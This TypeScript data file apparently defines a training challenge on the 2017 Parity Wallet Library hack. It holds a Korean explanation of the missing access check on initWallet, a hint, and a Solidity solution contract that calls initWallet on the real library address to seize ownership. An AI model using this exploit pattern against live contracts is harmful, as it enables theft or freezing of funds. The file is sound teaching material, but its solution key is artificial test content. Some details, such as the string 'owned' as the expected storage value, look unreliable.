// src/data/vulnerabilities/access-control/parity-wallet.ts

import type { VulnerabilityProblem } from "@/types/vulnerability";

export const parityWalletHack: VulnerabilityProblem = {
  id: "parity-wallet-library",
  title: "Parity Wallet Library Hack",
  category: "access-control",
  difficulty: "beginner",

  fork: {
    defaultRpc: "https://eth.llamarpc.com",
    chainId: 1,
    blockNumber: BigInt(4501968),
  },

  targetContract: {
    address: "0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4",
    name: "WalletLibrary",
    abi: [
      {
        name: "initWallet",
        type: "function",
        inputs: [
          { name: "_owners", type: "address[]", internalType: "address[]" },
          { name: "_required", type: "uint256", internalType: "uint256" },
          { name: "_dayLimit", type: "uint256", internalType: "uint256" },
        ],
        outputs: [],
        stateMutability: "nonpayable",
      },
    ],
  },

  description: `## 배경

2017년 11월, Parity Wallet Library 컨트랙트에서 치명적인 취약점이 발견되었습니다. 이 취약점으로 인해 수백 개의 멀티시그 월렛이 동결되었습니다.

## 취약점 분석

\`initWallet\` 함수가 이미 초기화된 컨트랙트에서도 호출 가능하며, 호출자 권한 검증이 누락되어 있습니다.

\`\`\`solidity
// 취약한 코드 구조
function initWallet(address[] _owners, uint _required, uint _dayLimit) {
  initWalletted(_owners, _required, _dayLimit);
  // 권한 체크 없음!
}
\`\`\`

## 목표

WalletLibrary 컨트랙트의 소유권을 획득하세요.`,

  exploitHint: "initWallet 함수를 직접 호출해보세요. 누구나 호출할 수 있습니다.",

  referenceLinks: [
    "https://medium.com/chainsecurity/parity-wallet-hack-2-analyze-the-attacks-5c9c2747a5a",
    "https://etherscan.io/address/0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4",
  ],

  successCondition: {
    checkStorage: {
      address: "0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4",
      slot: "0x0",
      expectedValue: "owned",
    },
  },

  solutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Exploit {
    address target = 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4;

    function attack() external {
        target.call(abi.encodeWithSignature(
            "initWallet(address[],uint256,uint256)",
            [address(this)],
            1,
            0
        ));
    }
}`,
};
